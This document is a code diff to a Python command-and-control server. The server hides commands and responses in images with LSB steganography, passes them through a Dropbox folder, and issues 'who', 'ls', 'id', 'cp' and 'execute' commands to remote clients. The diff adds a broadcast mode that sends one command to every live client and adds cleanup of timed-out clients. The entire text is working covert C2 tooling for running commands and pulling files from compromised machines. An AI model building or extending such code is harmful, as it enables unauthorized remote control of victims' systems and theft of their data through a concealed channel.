@@ -49,16 +49,18 @@ def print_prompt():
 
 def handle_client_selection(clients):
     print("\nSelect client name for sending commands")
-    for i, client in enumerate(list(clients)):
+    for i, client in enumerate(clients + ['broadcast']):
         print(str(i) + " " + client)
-    print("Type 0-" + str(len(clients)-1) + " to select a client")
+    print("Type 0-" + str(len(clients)) + " to select a client")
 
     i, o, e = select.select([sys.stdin], [], [], 15)
     if i:
         input_string = sys.stdin.readline()
         words = input_string.strip().split()
-        if len(words) != 1 or int(words[0]) < 0 or int(words[0]) >= len(clients):
+        if len(words) != 1 or int(words[0]) < 0 or int(words[0]) > len(clients):
             print("Error - Invalid Client")
+        elif int(words[0]) == len(clients):
+            return -3
         else:
             return int(words[0])
     else:
@@ -67,10 +69,26 @@ def handle_client_selection(clients):
 
     return -2    
 
-def handle_command_selection(dbx, clients, selected_client):
+
+def get_alive_clients(dbx, timedout_clients):
+    ret = []
+    for entry in dbx.files_list_folder('/art').entries:
+        if entry.name in timedout_clients:
+            continue
+        ret.append(entry.name)
+    return ret
+
+
+def handle_command_selection(dbx, timedout_clients, selected_client):
+    if selected_client == -3:
+        print("Selected client broadcast")
+    else:
+        print("Selected client " + str(selected_client))
     print_prompt()
     i, o, e = select.select([sys.stdin], [], [], 15) #timeout after 15 seconds
 
+    clients = get_alive_clients(dbx, timedout_clients)
+    print('Clients ', str(clients))
     commands = ['who', 'ls', 'id', 'cp', 'execute']
     if i:
         input_string = sys.stdin.readline()
@@ -88,9 +106,15 @@ def handle_command_selection(dbx, clients, selected_client):
         elif words[0] == '7':
             return -1
         elif words[0] in ['2','4', '5']:
-            execute_command(dbx, commands[int(words[0]) - 1] + ' ' + words[1], list(clients)[selected_client])
+            if selected_client == -3:
+                broadcast_command(dbx, commands[int(words[0]) - 1] + ' ' + words[1], clients)
+            else:
+                execute_command(dbx, commands[int(words[0]) - 1] + ' ' + words[1], clients[selected_client])
         else: 
-            execute_command(dbx, commands[int(words[0]) - 1], list(clients)[selected_client])
+            if selected_client == -3:
+                broadcast_command(dbx, commands[int(words[0]) - 1], clients)
+            else:
+                execute_command(dbx, commands[int(words[0]) - 1], clients[selected_client])
         print("")
     else:
         print("Timing out input to perform logic, wait for prompt...")
@@ -99,15 +123,9 @@ def handle_command_selection(dbx, clients, selected_client):
     return -2
 
 
-def send_heartbeat(dbx, clients):
-    #print(current_datetime() + " Sending heartbeat")
-    for entry in dbx.files_list_folder('/art').entries:
-        if not entry.name in clients.keys():
-            continue
-        print(current_datetime() + " Sending heartbeat to " + entry.name)
-        dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)
-
-        execute_command(dbx, 'heartbeat', entry.name)
+def broadcast_command(dbx, command, clients):
+    for client in clients:
+        execute_command(dbx, command, client)
 
 
 def execute_command(dbx, command, client):
@@ -129,7 +147,7 @@ def execute_command(dbx, command, client):
 
 def process_files(dbx, last_check, clients):
     for entry in dbx.files_list_folder('/art').entries:
-        if not entry.name in clients.keys():
+        if entry.name in timedout_clients:
             continue
 
         dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)
@@ -145,7 +163,7 @@ def process_files(dbx, last_check, clients):
             if last_check < response_time and fields[1] == 'RESPONSE':
                 if fields[2] == 'heartbeat' or fields[2] == 'register':
                     print("Heartbeat detected")
-                    clients[entry.name] = response_time
+                    #clients[entry.name] = response_time
                 elif fields[2].split(' ')[0] == 'cp':
                     print(fields[3])
                     file_name = fields[3].split('\n')[1]
@@ -156,19 +174,26 @@ def process_files(dbx, last_check, clients):
                     print(fields[3])
 
 
-def init_clients():
-    clients = dict()
+def update_timedout_clients(dbx, timedout_clients):
     for entry in dbx.files_list_folder('/art').entries:
+        if entry.name in timedout_clients:
+            continue
         dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)
 
         message = lsb.reveal(tmp_path + entry.name, lsb.generators.eratosthenes())
 
-        print(message.split(';'))
-        for line in message.split(';')[:-1]:
-            fields = line.split('|')
-            clients[entry.name] = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")
+        last_command = message.split(';')[-2]
+        last_time = datetime.strptime(last_command.split('|')[0], "%d/%m/%Y %H:%M:%S")
+        diff = datetime.now() - last_time 
+        if diff.seconds > TIMEOUT:
+            #register client as timed out
+            timedout_clients.append(entry.name)
+            #clean up
+            dbx.files_delete(entry.path_lower)
+            os.remove(tmp_path + entry.name)
 
-    return clients
+    return timedout_clients
+
 
 if __name__ == "__main__":
     if len(sys.argv) != 4:
@@ -182,16 +207,13 @@ if __name__ == "__main__":
                 os.makedirs(path)
 
         dbx = init(sys.argv[1])
-        
-        #secret = lsb.hide("./cute_in.png", "Hello world!\n",  lsb.generators.eratosthenes())
-        #secret.save("./cute_out.png")
 
-        clients = init_clients()
+        #clients = init_clients()
+        timedout_clients = update_timedout_clients(dbx, [])
 
-        print("Registered clients")
-        for k in clients.keys():
-            print(k)
-        print("")
+        #print("Timedout clients")
+        #print(timedout_clients)
+        #print("")
 
         last_heartbeat = datetime.now()
         last_check = datetime.now()
@@ -199,31 +221,25 @@ if __name__ == "__main__":
         selected_client = -1
 
         while True:
-            print("Selected client " + str(selected_client))
-
             check_diff = datetime.now() - last_check
             if check_diff.seconds > CHECK_PERIOD: 
                 tmp = datetime.now()
-                process_files(dbx, last_check, clients)
+                process_files(dbx, last_check, timedout_clients)
+                update_timedout_clients(dbx, timedout_clients)
                 last_check = tmp
+                selected_client = -1
 
-                for client in list(clients):
-                    client_diff = datetime.now() - clients[client]
-                    if client_diff.seconds > TIMEOUT:
-                        clients.pop(client, None)
-                        selected_client = -1
-            
             heartbeat_diff = datetime.now() - last_heartbeat
             if heartbeat_diff.seconds > HEARTBEAT_PERIOD:
                 tmp = datetime.now()
-                send_heartbeat(dbx, clients)
+                broadcast_command(dbx, 'heartbeat', get_alive_clients(dbx, timedout_clients))
                 last_heartbeat = tmp
 
             # read command
-            res = handle_command_selection(dbx, clients, selected_client) 
+            res = handle_command_selection(dbx, timedout_clients, selected_client) 
             if res == -1:
                 break
-            elif res >= 0:
+            elif res >= 0 or res == -3:
                 selected_client = res
 
 
